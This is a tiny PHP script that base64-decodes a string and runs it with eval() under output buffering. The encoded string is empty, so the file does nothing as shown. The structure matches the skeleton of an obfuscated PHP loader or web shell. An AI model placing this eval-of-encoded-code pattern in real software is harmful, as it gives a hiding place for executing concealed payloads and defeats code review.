<?php
$code = base64_decode('');
ob_start();
eval('?>' . $code);
$content = ob_get_clean();
echo $content;
?>